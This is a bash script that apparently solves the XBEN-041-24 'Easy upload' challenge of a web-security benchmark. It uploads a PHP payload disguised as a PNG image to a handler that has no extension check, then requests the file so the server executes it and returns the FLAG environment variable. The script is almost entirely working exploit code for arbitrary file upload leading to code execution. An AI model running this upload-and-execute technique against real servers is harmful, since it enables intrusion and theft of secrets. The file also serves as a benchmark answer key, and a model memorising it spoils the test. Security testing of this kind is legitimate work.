#!/usr/bin/env bash
# XBEN-041-24 — "Easy upload" (tags: arbitrary_file_upload, command_injection)
#
# The upload handler takes `basename($_FILES["userfile"]["name"])` and moves the
# file into the web root. There is no extension check, no content check and no
# handler override for the upload directory, so a `.php` name is executed by the
# same Apache that serves the images.
#
# The flag is in the environment, as the benchmark's hint says, so the payload
# is one call.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben041-$$"
NAME="probe$$.php"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/index.php" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/index.php' \
    --set 'multipart.userfile=<?php echo getenv("FLAG"); ?>' \
    --set "multipart.userfile.filename=$NAME" \
    --set 'multipart.userfile.content_type=image/png' \
    --set 'multipart.submit=Upload Image' \
    --session "$SESSION" >/dev/null
seq="$("$H5I" websec replay req_0 --create --set "path=/upload/$NAME" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
